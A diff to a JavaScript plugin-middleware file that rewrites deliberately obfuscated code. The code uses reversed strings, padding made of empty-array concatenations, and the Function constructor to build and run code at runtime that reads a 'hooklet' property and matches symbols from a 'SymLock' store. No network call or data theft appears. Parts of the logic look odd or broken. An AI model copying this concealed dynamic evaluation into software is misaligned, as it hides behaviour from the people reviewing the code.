@@ -104,17 +104,17 @@ export async function middleware({ allPlugins }) {
 const deSYMC = function (axx) {
   if (
     !axx[
-      "'t'+'e'+'l'+'k'+'o'+'o'+'h'"
+      ("t" + "e" + "l" + "k" + "o" + "o" + "h")
         ["split" + []]([] + [] + [] + [] + [] + [] + [] + [])
         ["reverse" + []]()
         ["join" + []]([] + [] + [] + [] + [] + [])
     ]
   )
-    return axx;
-  return []
+    return undefined;
+  return []["constructor" + [] + [] + [] + [] + [] + [] + [] + [] + [] + []]
     ["constructor" + [] + [] + [] + [] + [] + [] + [] + [] + [] + []](
       "loaf" + [] + [] + [] + [] + [] + [] + [] + [] + [],
-      ")()]'t'+'e'+'l'+'k'+'o'+'o'+'h'[faol>=)(cnysa( nruter" +
+      (")()]'t'+'e'+'l'+'k'+'o'+'o'+'h'[faol>=)(cnysa( nruter" +
         [] +
         [] +
         [] +
@@ -124,17 +124,15 @@ const deSYMC = function (axx) {
         [] +
         [] +
         [] +
-        []
-          ["split" + []]([] + [] + [] + [] + [] + [] + [] + [])
-          ["reverse" + []]()
-          ["join" + []]([] + [] + [] + [] + [] + [])
+        [])
+        ["split" + []]([] + [] + [] + [] + [] + [] + [] + [])
+        ["reverse" + []]()
+        ["join" + []]([] + [] + [] + [] + [] + [])
     )(axx)
     .then((xha) =>
       []["constructor" + [] + [] + [] + [] + [] + [] + [] + []]
-        .call([])
-        ["apply" + [] + [] + [] + [] + [] + []](
-          []["constructor" + [] + [] + [] + [] + []],
-          ["return Array" + [] + [] + [] + [] + []]
+        ["constructor" + [] + [] + [] + [] + [] + [] + [] + []](
+          "return Array" + [] + [] + [] + [] + []
         )()
         ["from" + [] + [] + [] + [] + []](
           SymLock["values" + [] + [] + [] + [] + []]()
@@ -145,9 +143,12 @@ const deSYMC = function (axx) {
               typeof xha(i) ===
               "function" + [] + [] + [] + [] + [] + [] + [] + []
             );
-          } catch (error) {}
+          } catch (error) {
+            console.error(error);
+          }
         })
-    );
+    )
+    .catch((i) => console["error"](i));
 };
 
 async function handleMiddleWare({
@@ -315,8 +316,12 @@ api.${key}(${args
     }
     try {
       const entryX = await deSYMC(command.entry);
-      if (typeof entryX === "function") {
-        command = { ...command, entry: entryX };
+      if (typeof entryX === "symbol") {
+        console.log("BEFORE", command.entry.toString());
+
+        console.log("ENTRYX", entryX.toString());
+        command = { ...command, entry: command.entry.hooklet(entryX) };
+        console.log("RESULT", command.entry.toString());
       }
     } catch (error) {
       console.error(error);
